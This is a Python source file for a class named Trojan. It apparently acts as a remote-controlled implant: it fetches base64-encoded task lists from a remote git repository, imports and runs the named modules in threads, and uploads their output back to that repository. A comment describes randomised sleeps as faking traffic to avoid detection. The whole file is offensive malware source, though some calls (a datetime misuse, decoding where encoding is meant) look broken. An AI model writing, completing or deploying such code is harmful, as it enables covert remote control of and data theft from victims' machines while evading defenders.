import base64
import json
import random
import sys
import threading
import datetime,time
from git_funcs import *
    
class Trojan:
    def __init__(self,id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = connect()

    def get_config(self):
        # take the configuration file and import the modules
        try:
            config_json = get_file_contents("config", self.config_file, self.repo)
            config= json.loads(base64.b64decode(config_json))
            for task in config:
                if task["module"] not in sys.modules:
                    exec(f"import {task['module']}")
            return config
        except Exception as e:
            print(f"Error getting config: {e}")

    def module_runner(self,module):
        result=sys.modules[module].run()
        self.store_result(result)

    def store_result(self, data):
        message = datetime.now().isoformat()
        remote_path=f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data,'utf-8')
        try:
            self.repo.create_file(remote_path, message, base64.b64decode(bindata), branch="main")
            print(f"Data stored at {remote_path}")
        except Exception as e:
            print(f"Error storing data: {e}")
    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task["module"],))
                thread.start()
                # fake some traffic here to avoid detection
                time.sleep(random.randint(1, 5))
            time.sleep(random.randint(1, 5))

